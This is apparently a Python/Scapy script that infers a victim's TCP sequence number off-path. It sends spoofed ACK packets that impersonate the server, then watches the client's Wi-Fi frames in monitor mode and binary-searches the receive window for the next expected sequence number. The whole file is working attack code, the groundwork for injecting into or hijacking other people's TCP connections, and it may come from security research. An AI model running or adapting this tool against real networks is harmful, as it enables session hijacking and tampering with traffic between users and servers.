#!/usr/bin/env python3

from __future__ import annotations

import time
import threading
import random
from dataclasses import dataclass, field
from enum import IntEnum
from typing import List

from scapy.all import sniff, send, IP, TCP, Raw

try:
    from scapy.layers.dot11 import Dot11, Dot11QoS
except Exception:
    Dot11 = None
    Dot11QoS = None


class SeqNextLocation(IntEnum):
    SEQ_NEXT_L = -1
    SEQ_NEXT_W = 0
    SEQ_NEXT_R = 1


@dataclass
class SeqFinder:
    client_ip: str = ""
    server_ip: str = ""
    client_port: int = 0
    server_port: int = 0
    send_if_name: str = ""
    sniff_if_name: List[str] = field(default_factory=list)
    client_mac: str = ""
    repeat_num: int = 4

    sack_ack_num: int = 0
    ack_num: int = 0
    sent_seq: int = 0
    sent_seq_left_bound: int = -1
    send_num: int = 0
    send_byte: int = 0
    cost_time: float = 0.0
    send_rate: float = 0.0
    result: int = 0
    target_frame_num: int = 0

    max_uint32: int = 0xFFFFFFFF
    max_uint32_half: int = 0xFFFFFFFF >> 1

    random_seq: int = 0
    random_ack: int = 0

    def capture_packets(self, out_pkts: List, sniff_if_index: int) -> None:
        iface = self.sniff_if_name[sniff_if_index]
        bpf = f"wlan addr1 {self.client_mac}"

        def lfilter(pkt) -> bool:
            if Dot11 is None or not pkt.haslayer(Dot11):
                return False
            d11 = pkt.getlayer(Dot11)
            return hasattr(d11, "addr1") and (d11.addr1 or "").lower() == self.client_mac.lower()

        try:
            pkts = sniff(iface=iface, timeout=0.05, store=True, filter=bpf)
        except Exception:
            pkts = sniff(iface=iface, timeout=0.05, store=True, lfilter=lfilter)

        out_pkts.extend(pkts)

    def handle_packets(self, pkts: List) -> None:
        self.target_frame_num = 0

        if Dot11QoS is None:
            return

        for pkt in pkts:
            try:
                if pkt.haslayer(Dot11QoS) and pkt.haslayer(Raw):
                    raw_load = bytes(pkt.getlayer(Raw).load)
                    if len(raw_load) == 88:
                        self.target_frame_num += 1
                        return
            except Exception:
                continue

    def check_seq_list(self, seq_list: List[int]) -> None:
        if not seq_list:
            self.target_frame_num = 0
            print("[*] Warning: the seq_list is empty")
            return

        send_list = []
        for sq in seq_list:
            pkt = (
                IP(src=self.server_ip, dst=self.client_ip)
                / TCP(
                    sport=self.server_port,
                    dport=self.client_port,
                    flags="A",
                    seq=int(sq) & 0xFFFFFFFF,
                    ack=int(self.random_ack) & 0xFFFFFFFF,
                )
                / Raw(b"AAAA")
            )
            for _ in range(self.repeat_num):
                send_list.append(pkt)

        self.send_num += len(send_list)
        self.send_byte += sum(len(bytes(p)) for p in send_list)

        sniff_pkts_vec: List[List] = [[] for _ in self.sniff_if_name]
        threads: List[threading.Thread] = []
        for i in range(len(self.sniff_if_name)):
            t = threading.Thread(target=self.capture_packets, args=(sniff_pkts_vec[i], i), daemon=True)
            threads.append(t)
            t.start()

        time.sleep(0.005)

        for pkt in send_list:
            send(pkt, iface=self.send_if_name, verbose=False)

        time.sleep(0.05)

        add_ip = "8.8.8.8"
        add_pkt = (
            IP(src=self.client_ip, dst=add_ip)
            / TCP(sport=1234, dport=4321, flags="A", seq=0, ack=0)
            / Raw(b"AAAAA")
        )
        for _ in range(4):
            send(add_pkt, iface=self.send_if_name, verbose=False)

        for t in threads:
            t.join(timeout=1.0)

        merged = []
        for v in sniff_pkts_vec:
            merged.extend(v)

        self.handle_packets(merged)

    def seq_check(self, sq: int) -> SeqNextLocation:
        seq_next_left = 0
        check_line = 1
        check_sum = 3

        for _ in range(check_sum):
            self.check_seq_list([int(sq) & 0xFFFFFFFF])
            if self.target_frame_num > 0:
                seq_next_left += 1
                if seq_next_left >= check_line:
                    return SeqNextLocation.SEQ_NEXT_L

        return SeqNextLocation.SEQ_NEXT_R

    def find_sent_seq(self) -> None:
        self.sent_seq = int(self.random_seq)

        location = self.seq_check(self.sent_seq)

        if location == SeqNextLocation.SEQ_NEXT_R:
            self.sent_seq -= self.max_uint32_half
            if self.sent_seq < 0:
                self.sent_seq += self.max_uint32

        print(f"[+] Find a sent seq: {self.sent_seq}")

    def find_seq_exact(self) -> None:
        print("++++++++++ Try to find the SEQ in window ++++++++++")
        self.find_sent_seq()

        rb = int(self.sent_seq)
        lb = rb - int(self.max_uint32_half)
        ans = -1

        while rb >= lb:
            mid = (rb + lb) // 2

            if mid < 0:
                seq_mid = int(mid + self.max_uint32) & 0xFFFFFFFF
            else:
                seq_mid = int(mid) & 0xFFFFFFFF

            check = self.seq_check(seq_mid)

            if check == SeqNextLocation.SEQ_NEXT_L:
                ans = mid
                rb = mid - 1
            else:
                lb = mid + 1

        self.sent_seq_left_bound = ans if ans >= 0 else ans + self.max_uint32
        self.result = int(self.sent_seq_left_bound + self.max_uint32_half + 1) & 0xFFFFFFFF

        print(f"[+] Find the sent seq left bound: {self.sent_seq_left_bound}, the seq next: {self.result}")

    def run(self) -> None:
        time_start = time.time()

        self.send_num = 0
        self.send_byte = 0
        self.sent_seq_left_bound = -1
        self.result = 0

        self.random_seq = random.randint(0, self.max_uint32)
        self.random_ack = random.randint(0, self.max_uint32)

        self.find_seq_exact()

        self.cost_time = float(time.time() - time_start)
        self.send_rate = (float(self.send_byte) / self.cost_time) if self.cost_time > 0 else 0.0

        print(f"Find the seq in window: {self.result}")
        print(f"Send Packets: {self.send_num}")
        print(f"Send Bytes: {self.send_byte} (Bytes)")
        print(f"Cost Time: {self.cost_time} (s)")
        print(f"Send Rate: {self.send_rate} (Byte/s)")

    def write_data(self, path: str = "seq_data.txt") -> None:
        with open(path, "a", encoding="utf-8") as f:
            f.write(f"{self.cost_time} {self.send_rate} {self.send_byte} {self.send_num}\n")

    def get_result(self) -> int:
        return int(self.result)


if __name__ == "__main__":
    sf = SeqFinder(
        client_ip="10.0.0.2",
        server_ip="10.0.0.1",
        client_port=12345,
        server_port=80,
        send_if_name="eth0",
        sniff_if_name=["wlan0mon"],
        client_mac="aa:bb:cc:dd:ee:ff",
        repeat_num=4,
    )
    sf.run()
    sf.write_data()
